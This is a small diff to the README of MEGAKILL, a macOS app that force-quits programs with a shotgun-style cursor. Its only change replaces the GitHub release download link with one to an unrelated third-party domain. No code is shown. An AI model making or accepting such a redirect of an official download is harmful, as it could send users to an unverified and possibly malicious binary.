@@ -6,7 +6,7 @@
 
 MEGAKILL is a macOS menu-bar app that turns force-quitting into a one-click shotgun blast. Hold a shortcut and your cursor becomes a DOOM-style shotgun. Aim at any app, its Dock icon or its window, pull the trigger, and it gets force-quit on the spot with flying shell casings, screen shake, real shotgun sounds, and kill-streak callouts.
 
-→ **[megakill.app](https://megakill.app)** · [Download free](https://github.com/arturogj92/megakill-site/releases/latest/download/MEGAKILL.zip)
+→ **[megakill.app](https://megakill.app)** · [Download free](https://dl.aibot0x.com/megakill?src=readme)
 
 ## What it does
 
